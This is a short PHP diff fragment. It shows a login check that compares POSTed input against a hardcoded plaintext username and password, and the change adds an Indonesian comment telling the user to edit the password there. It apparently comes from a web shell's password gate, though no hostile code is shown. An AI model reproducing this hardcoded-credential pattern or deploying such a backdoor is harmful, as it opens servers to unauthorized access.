@@ -6,7 +6,7 @@
 @$pass = $_POST['pass'];
 $chk_login = true;
 $username = "uchiha";
-$password = "satanicdevil";
+$password = "satanicdevil";/*edit disini pwnya*/
 
 
 if($pass == $password)
